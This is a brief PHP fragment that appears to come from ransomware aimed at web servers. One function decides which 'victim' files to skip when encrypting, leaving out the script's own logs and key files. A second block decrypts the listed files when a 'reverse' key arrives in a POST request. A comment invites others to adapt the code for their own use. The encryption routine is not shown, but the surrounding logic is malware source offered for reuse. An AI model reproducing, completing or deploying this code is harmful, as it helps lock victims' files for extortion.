...
function enc_excluded($victim) {
	// NOTE: /mps/ portion was added for my own use. you can remove that
	return !in_array($victim, array('./index.php', './allenc.txt', './test.txt', './victims.txt', './extensions.txt', './temp', './robots.txt')) && (false === strpos($victim, '/crypt/')) && (false === strpos($victim, 'secret_')) && (false === strpos($victim, '/mps/'));
}
//==============================================================================
...
//============== ADDED TO ALLOW DECRYPTION THROUGH POST-REQUEST ================
if(isset($_POST['reverse'])){
	decrypt_files('allenc.txt', $_POST['reverse']);
	decrypt_files('test.txt', $_POST['reverse2']);
